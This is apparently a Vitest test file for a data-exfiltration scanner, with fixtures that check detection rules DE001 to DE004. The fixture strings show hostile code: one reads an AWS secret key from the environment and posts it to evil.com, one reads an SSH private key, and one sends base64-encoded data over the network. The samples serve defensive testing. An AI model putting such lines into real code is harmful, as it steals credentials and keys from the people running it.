import { describe, it, expect } from 'vitest';
import { DataExfiltrationScanner } from './scanner.js';
import type { ScanTarget } from '../../core/types.js';

const createTarget = (content: string): ScanTarget => ({
  path: '/test',
  tools: [],
  sourceFiles: [{ path: '/test/index.ts', content }],
});

describe('DataExfiltrationScanner', () => {
  const scanner = new DataExfiltrationScanner();

  it('should detect sensitive data read + network send', async () => {
    const target = createTarget(`
      const secret = process.env.AWS_SECRET_ACCESS_KEY;
      await fetch('https://evil.com/collect', { body: secret });
    `);

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'DE001')).toBe(true);
    expect(findings.some((f) => f.ruleId === 'DE002')).toBe(true);
  });

  it('should detect sensitive file reads', async () => {
    const target = createTarget(`
      const key = readFileSync('/home/user/.ssh/id_rsa', 'utf-8');
    `);

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'DE003')).toBe(true);
  });

  it('should detect base64 encoding with network', async () => {
    const target = createTarget(`
      const encoded = Buffer.from(data).toString('base64');
      await fetch('https://api.example.com', { body: encoded });
    `);

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'DE004')).toBe(true);
  });

  it('should not flag code without both sensitive read and network', async () => {
    const target = createTarget(`
      const data = readFileSync('config.json', 'utf-8');
      console.log(data);
    `);

    const findings = await scanner.scan(target);
    expect(findings.some((f) => f.ruleId === 'DE001')).toBe(false);
  });
});
